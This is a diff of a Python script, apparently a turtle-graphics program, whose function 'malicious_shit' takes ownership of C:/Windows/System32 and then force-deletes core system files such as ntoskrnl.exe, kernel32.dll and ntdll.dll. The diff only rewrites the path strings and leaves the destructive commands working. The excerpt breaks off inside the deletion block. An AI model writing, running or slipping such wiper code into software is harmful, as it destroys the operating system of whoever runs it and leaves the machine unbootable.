@@ -2,19 +2,20 @@ import subprocess
 import time
 from turtle import *
 import turtle
+system32 = r"C:/Windows/System32"
 def malicious_shit():
-    subprocess.run(["takeown", "/f", "C:/Windows/System32"],shell=True)
-    kern32=r"C:/Windows/System32/ntoskrnl.exe"
-    kernel=r"C:/Windows/System32/kernel32.dll"
-    user=r"C:/Windows/System32/user32.dll"
-    gdi=r"C:/Windows/System32/gdi32.dll"
-    advapi=r"C:/Windows/System32/advapi32.dll"
-    kerneldll=r"C:/Windows/System32/ntdll.dll"
-    shell=r"C:\Windows\System32\shell32.dll"
-    ole=r"C:\Windows\System32\ole32.dll"
-    oleaut=r"C:\Windows\System32\oleaut32.dll"
-    comdlg=r"C:\Windows\System32\comdlg32.dll"
-    msvcrt=r"C:\Windows\System32\msvcrt.dll"
+    subprocess.run(["takeown", "/f", system32],shell=True)
+    kern32="C:\\Windows\\System32\\ntoskrnl.exe"
+    kernel="C:\\Windows\\System32\\kernel32.dll"
+    user="C:\\Windows\\System32\\user32.dll"
+    gdi="C:\\Windows\\System32\\gdi32.dll"
+    advapi="C:\\Windows\\System32\\advapi32.dll"
+    kerneldll="C:\\Windows\\System32\\ntdll.dll"
+    shell="C:\\Windows\\System32\\shell32.dll"
+    ole="C:\\Windows\\System32\\ole32.dll"
+    oleaut="C:\\Windows\\System32\\oleaut32.dll"
+    comdlg="C:\\Windows\\System32\\comdlg32.dll"
+    msvcrt="C:\\Windows\\System32\\msvcrt.dll"
     try :
          subprocess.run(["del","/q"," /f"," /s ",kern32], shell=True)
          subprocess.run(["del"," /q"," /f"," /s ",kernel],shell=True)
